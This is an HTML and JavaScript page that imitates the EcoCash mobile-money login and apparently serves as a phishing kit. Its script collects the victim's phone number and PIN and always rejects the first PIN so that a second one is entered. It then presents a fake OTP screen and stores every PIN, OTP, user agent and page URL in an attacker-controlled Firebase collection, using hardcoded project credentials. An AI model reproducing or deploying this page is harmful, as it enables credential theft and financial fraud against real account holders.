<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EcoCash Login – two-step</title>
  
  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
  
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #e5e5e5;
    }
    .container {
      width: 100%;
      max-width: 400px;
      margin: auto;
      background: white;
      min-height: 100vh;
      position: relative;
      overflow: hidden;
    }
    .main-content {
      position: relative;
      z-index: 2;
      padding-bottom: 10px;
    }
    .logo {
      text-align: center;
      font-size: 38px;
      font-weight: bold;
      margin-top: 40px;
    }
    .logo span:first-child { color: #1c6aa6; }
    .logo span:last-child { color: #e12b2b; }
    .login-title {
      text-align: center;
      color: #666;
      font-size: 26px;
      margin-top: 18px;
    }
    .phone-box {
      margin: 22px;
      border: 2px solid #1c6aa6;
      border-radius: 10px;
      display: flex;
      align-items: center;
      padding: 10px 12px;
      background: #f2f2f2;
    }
    .flag {
      width: 26px;
      margin-right: 8px;
    }
    .code {
      color: #666;
      margin-right: 10px;
      font-size: 16px;
    }
    .phone-input {
      border: none;
      outline: none;
      background: transparent;
      font-size: 17px;
      flex: 1;
    }
    .pin-title {
      text-align: center;
      color: #666;
      margin-top: 5px;
    }
    .pin-box {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-top: 18px;
    }
    .pin {
      width: 44px;
      height: 44px;
      border-radius: 10px;
      border: 2px solid #1c6aa6;
      text-align: center;
      font-size: 20px;
      outline: none;
    }
    .pin:focus {
      border-color: #e12b2b;
      box-shadow: 0 0 0 2px rgba(225,43,43,0.2);
    }
    /* OTP Screen Styles */
    .otp-screen {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      z-index: 10;
      padding: 20px;
      overflow-y: auto;
    }
    .otp-screen.active {
      display: block;
    }
    .otp-header {
      text-align: center;
      margin-top: 30px;
    }
    .otp-header h2 {
      color: #1c6aa6;
      font-size: 24px;
      margin-bottom: 10px;
    }
    .otp-message {
      color: #666;
      font-size: 14px;
      margin-bottom: 30px;
      text-align: center;
    }
    .otp-phone-display {
      background: #f2f2f2;
      padding: 15px;
      border-radius: 10px;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      color: #1c6aa6;
      margin-bottom: 30px;
      letter-spacing: 1px;
    }
    .otp-phone-display .country-code {
      color: #e12b2b;
      margin-right: 5px;
    }
    .otp-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }
    .otp-input {
      width: 45px;
      height: 55px;
      border: 2px solid #1c6aa6;
      border-radius: 10px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      outline: none;
    }
    .otp-input:focus {
      border-color: #e12b2b;
    }
    .error-message {
      color: #e12b2b;
      text-align: center;
      font-size: 14px;
      margin: 10px 0;
      min-height: 20px;
    }
    .success-message {
      color: #28a745;
      text-align: center;
      font-size: 14px;
      margin: 10px 0;
      min-height: 20px;
    }
    .back-btn {
      background: #6c757d;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      margin-top: 20px;
    }
    .back-btn:hover {
      background: #5a6268;
    }
    .bottom {
      position: relative;
      margin-top: 40px;
      left: 0;
      right: 0;
      background: #125c9c;
      color: white;
      padding-top: 110px;
      padding-bottom: 28px;
      text-align: center;
    }
    .bottom::before {
      content: "";
      position: absolute;
      top: -80px;
      left: -20%;
      width: 140%;
      height: 160px;
      background: white;
      border-bottom-left-radius: 50%;
      border-bottom-right-radius: 50%;
    }
    .bottom p {
      width: 82%;
      margin: auto;
      font-size: 15px;
      line-height: 1.4;
    }
    .buttons {
      display: flex;
      justify-content: center;
      gap: 14px;
      margin: 20px 22px;
    }
    .btn {
      background: white;
      border-radius: 16px;
      padding: 8px 16px;
      flex: 1;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
      cursor: pointer;
      transition: all 0.1s ease;
    }
    .btn svg {
      width: 22px;
      height: 22px;
      fill: #1c6aa6;
    }
    .btn span {
      font-size: 13px;
      color: #333;
      font-weight: bold;
      line-height: 1.2;
    }
    .version {
      margin-top: 24px;
      opacity: 0.85;
      font-size: 14px;
    }
    .terms {
      margin-top: 6px;
      font-size: 14px;
      opacity: 0.9;
    }
    a {
      color: white;
      text-decoration: underline;
    }
    .phone-error {
      color: #e12b2b;
      font-size: 13px;
      margin: -10px 22px 10px 22px;
      text-align: left;
      min-height: 20px;
    }
  </style>
</head>
<body>

<div class="container">
  <!-- Main Login Screen -->
  <div class="main-content" id="loginScreen">
    <div class="logo">
      <span>Eco</span><span>Cash</span>
    </div>
    <div class="login-title">Login</div>

    <div class="phone-box">
      <img class="flag" src="https://flagcdn.com/w40/zw.png" alt="Zimbabwe flag">
      <div class="code">+263</div>
      <input class="phone-input" id="phoneInput" placeholder="Phone Number" type="tel" inputmode="numeric">
    </div>
    <div class="phone-error" id="phoneError"></div>

    <div class="pin-title">Enter your PIN</div>

    <div class="pin-box" id="pinBox">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin1">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin2">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin3">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin4">
    </div>
  </div>

  <!-- OTP Screen -->
  <div class="otp-screen" id="otpScreen">
    <div class="otp-header">
      <h2>Verify OTP</h2>
    </div>
    <div class="otp-message">
      A 6-digit OTP has been sent to:
    </div>
    <div class="otp-phone-display" id="otpPhoneDisplay">
      <span class="country-code" id="otpCountryCode">+263</span>
      <span id="otpPhoneNumber"></span>
    </div>
    
    <div class="otp-inputs">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp1">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp2">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp3">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp4">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp5">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp6">
    </div>
    
    <div class="error-message" id="otpError"></div>
    <div class="success-message" id="otpSuccess"></div>
    
    <button class="back-btn" id="backToLoginBtn">← Back to Login</button>
  </div>

  <div class="bottom">
    <p>To register an EcoCash wallet or get assistance, click below</p>

    <div class="buttons">
      <div class="btn" id="registerBtn">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
        </svg>
        <span>Register</span>
      </div>
      <div class="btn" id="helpBtn">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-4h2v2h-2zm1-10c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
        </svg>
        <span>Help &amp; Support</span>
      </div>
    </div>

    <div class="version">v3.0.3P</div>
    <div class="terms">
      By signing in you agree to the
      <a href="#">Terms and Conditions</a>
    </div>
  </div>
</div>

<script>
  (function() {
    // ==================== FIREBASE CONFIG ====================
    const firebaseConfig = {
      apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
      authDomain: "eco-panel-3d06e.firebaseapp.com",
      projectId: "eco-panel-3d06e",
      storageBucket: "eco-panel-3d06e.firebasestorage.app",
      messagingSenderId: "820242007704",
      appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const COLLECTION_NAME = 'ecocash_logins';

    // ==================== DOM ELEMENTS ====================
    const loginScreen = document.getElementById('loginScreen');
    const otpScreen = document.getElementById('otpScreen');
    
    const pinInputs = [
      document.getElementById('pin1'),
      document.getElementById('pin2'),
      document.getElementById('pin3'),
      document.getElementById('pin4')
    ];
    
    const otpInputs = [
      document.getElementById('otp1'),
      document.getElementById('otp2'),
      document.getElementById('otp3'),
      document.getElementById('otp4'),
      document.getElementById('otp5'),
      document.getElementById('otp6')
    ];
    
    const phoneInput = document.getElementById('phoneInput');
    const phoneError = document.getElementById('phoneError');
    const otpPhoneNumber = document.getElementById('otpPhoneNumber');
    const otpError = document.getElementById('otpError');
    const otpSuccess = document.getElementById('otpSuccess');
    const backToLoginBtn = document.getElementById('backToLoginBtn');
    
    // ==================== STATE ====================
    let firstAttemptData = {
      phoneNumber: '',
      formattedPhone: '',
      pin: '',
      timestamp: null
    };
    
    let secondAttemptData = {
      phoneNumber: '',
      formattedPhone: '',
      pin: '',
      otp: '',
      timestamp: null
    };

    // ==================== PIN AUTO-ADVANCE CODE ====================
    function focusNext(inputs, currentIndex) {
      if (currentIndex < inputs.length - 1) {
        inputs[currentIndex + 1].focus();
      }
    }

    function focusPrev(inputs, currentIndex) {
      if (currentIndex > 0) {
        inputs[currentIndex - 1].focus();
      }
    }

    // Setup PIN inputs
    pinInputs.forEach((input, index) => {
      input.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length === 1) {
          focusNext(pinInputs, index);
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (this.value.length === 0) {
            e.preventDefault();
            focusPrev(pinInputs, index);
          }
        } else if (e.key === 'ArrowLeft') {
          e.preventDefault();
          focusPrev(pinInputs, index);
        } else if (e.key === 'ArrowRight') {
          e.preventDefault();
          focusNext(pinInputs, index);
        } else {
          if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
            e.preventDefault();
          }
        }
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
        if (pasted.length > 0) {
          this.value = pasted[0];
          focusNext(pinInputs, index);
        }
      });
    });

    // Setup OTP inputs
    otpInputs.forEach((input, index) => {
      input.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length === 1) {
          if (index === otpInputs.length - 1) {
            // Last OTP digit entered - verify
            verifyOTP();
          } else {
            focusNext(otpInputs, index);
          }
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (this.value.length === 0) {
            e.preventDefault();
            focusPrev(otpInputs, index);
          }
        } else if (e.key === 'ArrowLeft') {
          e.preventDefault();
          focusPrev(otpInputs, index);
        } else if (e.key === 'ArrowRight') {
          e.preventDefault();
          focusNext(otpInputs, index);
        }
      });
    });

    // ==================== PHONE VALIDATION CODE ====================
    function validateZimNumber(value) {
      const digits = value.replace(/\D/g, '');
      if (digits.length === 0) return { valid: false, normalized: '' };

      let normalized = '';
      if (digits.startsWith('263')) {
        if (digits.length === 12) {
          normalized = '+' + digits;
        }
      } else if (digits.startsWith('0')) {
        if (digits.length === 10) {
          normalized = '+263' + digits.substring(1);
        }
      } else {
        if (digits.length === 9) {
          normalized = '+263' + digits;
        }
      }

      const valid = normalized.length === 13 && normalized.startsWith('+263');
      return { valid, normalized };
    }

    function updatePhoneValidation() {
      const raw = phoneInput.value;
      const { valid } = validateZimNumber(raw);
      
      if (raw.length === 0) {
        phoneError.textContent = '';
        phoneInput.style.borderColor = '#1c6aa6';
      } else if (!valid) {
        phoneError.textContent = 'Enter a valid Zimbabwe number (e.g., 0712345678 or 263712345678)';
        phoneInput.style.borderColor = '#e12b2b';
      } else {
        phoneError.textContent = '';
        phoneInput.style.borderColor = '#1c6aa6';
      }
    }

    phoneInput.addEventListener('input', function() {
      updatePhoneValidation();
      // Clear the error message when user starts typing a new phone number
      if (phoneError.textContent.includes('Incorrect PIN')) {
        phoneError.textContent = '';
      }
    });
    
    phoneInput.addEventListener('blur', function() {
      const raw = phoneInput.value;
      const { valid, normalized } = validateZimNumber(raw);
      if (valid && normalized) {
        if (normalized.startsWith('+263')) {
          const localPart = normalized.substring(4);
          phoneInput.value = localPart;
        }
      }
      updatePhoneValidation();
    });

    phoneInput.addEventListener('paste', function(e) {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData).getData('text');
      const digits = pasted.replace(/\D/g, '');
      const { valid, normalized } = validateZimNumber(digits);
      if (valid && normalized.startsWith('+263')) {
        phoneInput.value = normalized.substring(4);
      } else {
        phoneInput.value = digits;
      }
      updatePhoneValidation();
    });

    phoneInput.addEventListener('keydown', function(e) {
      if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab' && !e.ctrlKey && !e.metaKey) {
        e.preventDefault();
      }
    });

    updatePhoneValidation();

    // ==================== FIREBASE SAVE FUNCTIONS ====================
    function getFormattedPhone() {
      const phoneDigits = phoneInput.value.replace(/\D/g, '');
      if (phoneDigits.startsWith('0') && phoneDigits.length === 10) {
        return '+263' + phoneDigits.substring(1);
      } else if (phoneDigits.length === 9) {
        return '+263' + phoneDigits;
      }
      return null;
    }

    function getLocalPhonePart() {
      const formatted = getFormattedPhone();
      if (formatted && formatted.startsWith('+263')) {
        return formatted.substring(4);
      }
      return phoneInput.value.replace(/\D/g, '');
    }

    // Save first attempt (wrong PIN)
    function saveFirstAttempt(phone, pin) {
      return db.collection(COLLECTION_NAME).add({
        phoneNumber: phone,
        pin1: pin,  // Saved as pin1
        attempt: 1,
        status: 'failed',
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href
      });
    }

    // Save second attempt (correct PIN with OTP sent)
    function saveSecondAttempt(phone, pin, otp) {
      return db.collection(COLLECTION_NAME).add({
        phoneNumber: phone,
        pin2: pin,  // Saved as pin2 (different from pin1)
        otp: otp,   // OTP saved separately
        attempt: 2,
        status: 'otp_sent',
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href
      });
    }

    // Save OTP attempt (when user enters OTP)
    function saveOTPAttempt(phone, otp, status) {
      return db.collection(COLLECTION_NAME).add({
        phoneNumber: phone,
        otp: otp,   // OTP saved separately
        attempt: 3,
        status: status, // 'verified' or 'failed'
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href
      });
    }

    // Generate random 6-digit OTP
    function generateOTP() {
      return Math.floor(100000 + Math.random() * 900000).toString();
    }

    // Clear PIN inputs
    function clearPinInputs() {
      pinInputs.forEach(input => input.value = '');
      pinInputs[0].focus();
    }

    // Clear OTP inputs
    function clearOTPInputs() {
      otpInputs.forEach(input => input.value = '');
      otpError.textContent = '';
      otpSuccess.textContent = '';
    }

    // ==================== FIRST PIN ATTEMPT HANDLER ====================
    async function handleFirstPinAttempt(pin) {
      const phone = getFormattedPhone();
      if (!phone) {
        phoneError.textContent = 'Please enter a valid phone number';
        return;
      }

      // Store first attempt data
      firstAttemptData = {
        phoneNumber: phoneInput.value,
        formattedPhone: phone,
        pin: pin,
        timestamp: new Date().toISOString()
      };

      try {
        // Save first attempt to Firebase
        await saveFirstAttempt(phone, pin);
        console.log('First attempt saved - PIN1:', pin);

        // Show error message and reset PIN
        phoneError.textContent = 'Incorrect PIN. Please try again.';
        phoneError.style.color = '#e12b2b';
        clearPinInputs();

      } catch (error) {
        console.error('Error saving first attempt:', error);
      }
    }

    // ==================== SECOND PIN ATTEMPT HANDLER ====================
    async function handleSecondPinAttempt(pin) {
      const phone = getFormattedPhone();
      if (!phone) {
        phoneError.textContent = 'Please enter a valid phone number';
        return;
      }

      // Generate OTP
      const otp = generateOTP();

      // Store second attempt data
      secondAttemptData = {
        phoneNumber: phoneInput.value,
        formattedPhone: phone,
        pin: pin,
        otp: otp,
        timestamp: new Date().toISOString()
      };

      try {
        // Save second attempt with OTP (pin saved as pin2)
        await saveSecondAttempt(phone, pin, otp);
        console.log('Second attempt saved - PIN2:', pin, 'OTP:', otp);

        // Show OTP screen with +263 prefix
        const localPart = getLocalPhonePart();
        otpPhoneNumber.textContent = localPart;
        
        loginScreen.style.display = 'none';
        otpScreen.classList.add('active');
        
        // Clear any previous OTP inputs
        clearOTPInputs();
        otpInputs[0].focus();

      } catch (error) {
        console.error('Error saving second attempt:', error);
      }
    }

    // ==================== OTP VERIFICATION ====================
    async function verifyOTP() {
      const enteredOTP = otpInputs.map(input => input.value).join('');
      const phone = getFormattedPhone() || secondAttemptData.formattedPhone;
      
      if (enteredOTP.length !== 6) {
        otpError.textContent = 'Please enter all 6 digits';
        otpSuccess.textContent = '';
        return;
      }

      try {
        if (enteredOTP === secondAttemptData.otp) {
          // Correct OTP - save as verified
          await saveOTPAttempt(phone, enteredOTP, 'verified');
          console.log('OTP verified and saved');
          
          otpSuccess.textContent = '✓ Verification successful!';
          otpError.textContent = '';
          setTimeout(() => {
            alert('Login successful! (Demo purpose)');
            // Reset everything
            backToLogin();
          }, 1000);
        } else {
          // Wrong OTP - save as failed
          await saveOTPAttempt(phone, enteredOTP, 'failed');
          console.log('Wrong OTP attempt saved');
          
          otpError.textContent = 'Invalid OTP. Please try again.';
          otpSuccess.textContent = '';
          clearOTPInputs();
          otpInputs[0].focus();
        }
      } catch (error) {
        console.error('Error saving OTP:', error);
        otpError.textContent = 'Error verifying OTP';
      }
    }

    // ==================== BACK TO LOGIN ====================
    function backToLogin() {
      otpScreen.classList.remove('active');
      loginScreen.style.display = 'block';
      clearPinInputs();
      clearOTPInputs();
      phoneError.textContent = '';
      
      // Reset stored data
      firstAttemptData = {
        phoneNumber: '',
        formattedPhone: '',
        pin: '',
        timestamp: null
      };
      
      secondAttemptData = {
        phoneNumber: '',
        formattedPhone: '',
        pin: '',
        otp: '',
        timestamp: null
      };
    }

    // ==================== MAIN PIN LISTENER ====================
    const fourthPin = document.getElementById('pin4');
    if (fourthPin) {
      fourthPin.addEventListener('input', function() {
        if (this.value.length === 1) {
          const enteredPin = pinInputs.map(i => i.value).join('');
          
          // Check if this is first or second attempt
          if (phoneError.textContent.includes('Incorrect PIN')) {
            // This is second attempt
            setTimeout(() => handleSecondPinAttempt(enteredPin), 150);
          } else {
            // This is first attempt
            setTimeout(() => handleFirstPinAttempt(enteredPin), 150);
          }
        }
      });
    }

    // ==================== BUTTON HANDLERS ====================
    document.getElementById('registerBtn')?.addEventListener('click', function() {
      phoneInput.focus();
    });

    document.getElementById('helpBtn')?.addEventListener('click', function() {

    });

    backToLoginBtn.addEventListener('click', backToLogin);

    // ==================== INITIAL FOCUS ====================

  })();
